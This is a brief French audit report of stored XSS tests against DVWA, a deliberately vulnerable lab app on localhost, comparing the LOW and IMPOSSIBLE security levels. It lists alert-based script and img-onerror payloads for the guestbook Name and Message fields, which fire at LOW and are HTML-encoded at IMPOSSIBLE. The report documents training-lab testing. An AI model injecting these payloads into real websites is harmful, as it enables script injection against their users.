# XSS Stored - Rapport d'audit

**Catégorie OWASP Top 10** : A03:2021 - Injection
**Sévérité** : Moyenne
**URL testée** : http://localhost/DVWA/vulnerabilities/xss_s/
**Date du test** : 07/07/2026

---

## Messages observés

**Succès** :
Guestbook signé

**Échec** :
(Aucun message d'erreur spécifique)

---

## Résultats des tests

### Niveau LOW

**Test 1 : Comportement normal**
- Name : test
- Message : test message
- Résultat : Message affiché dans le guestbook

**Test 2 : Injection XSS dans le champ Name**
- Name : <script>alert('XSS')</script>
- Message : test
- Résultat : Pop up d'alterte

**Test 3 : Injection XSS dans le champ Message**
- Name : test
- Message : <script>alert('XSS')</script>
- Résultat : Pop up d'alterte

**Test 4 : XSS avec image**
- Name : test
- Message : <img src=x onerror=alert('XSS')>
- Résultat : Pop up d'alterte

---

### Niveau IMPOSSIBLE

**Test 1 : Injection XSS dans le champ Name**
- Name : <script>alert('XSS')</script>
- Message : test
- Résultat :  &amp;lt;script

**Test 2 : Injection XSS dans le champ Message**
- Name : test
- Message : <script>alert('XSS')</script>
- Résultat : &lt;script&gt;alert(\&#039;XSS\&#039;)&lt;/script&gt; 

---


